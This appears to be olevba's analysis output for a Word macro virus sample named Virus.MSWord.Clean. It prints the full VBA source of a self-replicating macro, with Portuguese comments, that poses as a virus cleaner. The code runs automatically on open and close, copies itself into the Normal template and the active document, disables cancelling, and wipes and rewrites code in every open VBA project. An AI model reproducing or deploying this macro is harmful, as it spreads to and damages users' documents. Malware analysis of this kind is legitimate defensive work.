olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Clean
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Clean - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'#########################################################################
'###    O Modelo Deste Documento Está Protegido por uma Macro Ativa.   ###
'###    Clean'All - Analisado por 'Mario Hecules', em 05/04/2000       ###
'###    Tecnomecânica Esmaltec Ltda - Fortaleza-Ce                     ###
'#########################################################################
-------------------------------------------------------------------------------
VBA MACRO CleanAll.bas 
in file: Virus.MSWord.Clean - OLE stream: 'Macros/VBA/CleanAll'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Options.VirusProtection = True
    Call E
    Call Delete
    Call CleanAll
End Sub

Sub AutoOpen()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Call E
    Call Delete
    Call CleanAll
End Sub

Sub AutoNew()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Call Delete
End Sub

Sub AutoClose()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Call Delete
    Call CleanAll
End Sub

Function E()
    On Error Resume Next
    Application.EnableCancelKey = wdCancelDisabled
    Dim A, B As String
    A = Application.NormalTemplate.FullName
    B = Application.ActiveDocument.FullName
    Application.OrganizerCopy A, B, "CleanAll", wdOrganizerObjectProjectItems
    Application.OrganizerCopy B, A, "CleanAll", wdOrganizerObjectProjectItems
    Call Delete
End Function

Public Sub AdicionarTeste()
For i = 1 To 200
    ThisDocument.VBProject.VBComponents(1).CodeModule.InsertLines i, "Dim MacrodeTeste_Number_" & i & " as String"
Next i
End Sub

Public Sub Delete()
Dim i As Integer
Dim sDocument As ThisDocument
Dim Scount As String

Scount = ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

'Faz um Loop em todo o documento
For i = 1 To Scount
    ThisDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1
Next i


'Adiciona Parâmetros de Abertura
With ThisDocument.VBProject.VBComponents(1).CodeModule
    .InsertLines 1, "'#########################################################################"
    .InsertLines 2, "'###    O Modelo Deste Documento Está Protegido por uma Macro Ativa.   ###"
    .InsertLines 3, "'###    Clean'All - Analisado por 'Mario Hecules', em 05/04/2000       ###"
    .InsertLines 4, "'###    Tecnomecânica Esmaltec Ltda - Fortaleza-Ce                     ###"
    .InsertLines 5, "'#########################################################################"
End With

End Sub

Private Sub ImportarCleanAll()
For i = 1 To ThisDocument.VBProject.Collection.Count
    ThisDocument.VBProject.Collection(i).VBComponents.Import "c:\meus documentos\BasCode\CleanAll.bas"
Next i
End Sub

Private Sub ExcluirModulos()
For i = 1 To ThisDocument.VBProject.Collection.Count
    ThisDocument.VBProject.Collection(i).VBComponents.Remove
Next i
End Sub

Private Sub ExportarCleanAll()
For i = 1 To ThisDocument.VBProject.Collection.Count
    If ThisDocument.VBProject.Collection(i).VBComponents(2).Name = "CleanAll" Then
    ThisDocument.VBProject.Collection(1).VBComponents.Item(2).Export "c:\Arquivos de Programas\Microsoft Office\Modelos\CleanAll.bas"
    End If
Next i
End Sub

Public Sub CleanAll() 'Apaga o virus de Macro.
For i = 1 To Application.VBE.ActiveVBProject.Collection.Count
    'Documentos Abertos
     Application.VBE.VBProjects.Item (i)
    
    For j = 1 To Application.VBE.VBProjects.Item(i).VBComponents.Count
    'Verifica Nomes de Codigo Bas e Excluir
        VBE.ActiveVBProject.VBComponents.Item (j)
    
    'Deleta todas as informações de Virus
        For k = 1 To VBE.ActiveVBProject.VBComponents.Item(j).CodeModule.CountOfLines
            VBE.ActiveVBProject.VBComponents.Item(j).CodeModule.DeleteLines (1)
            If VBE.ActiveVBProject.VBComponents.Item(j).Name = "CleanAll" Then VBE.ActiveVBProject.VBComponents.Item(j).CodeModule.InsertLines 1, "Sub AutoExec()"
        Next k
    
    Next j
    
Next i
Call Delete
End Sub

Private Sub FindName()

For i = 1 To Application.VBE.ActiveVBProject.Collection.Count
    'Documentos Abertos
    Debug.Print Application.VBE.VBProjects.Item(i).Name
    
    For j = 1 To Application.VBE.VBProjects.Item(i).VBComponents.Count
    'Verifica Nomes de Codigo Bas
        Debug.Print VBE.ActiveVBProject.VBComponents.Item(j).Name
    Next j
    
Next i
End Sub


'##################################################################################################
'COMENTÁRIOS

'Adicionar no Modulo
'ThisDocument.VBProject.VBE.ActiveCodePane.CodeModule.InsertLines 1, "Public Sub teste"

'Adicionar no Normal
'ThisDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, "Public Sub teste"

'Documentos Abertos
'Debug.Print Application.VBE.VBProjects.Item(i).Name
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |VBProject.VBE       |Executable file name                         |
+----------+--------------------+---------------------------------------------+

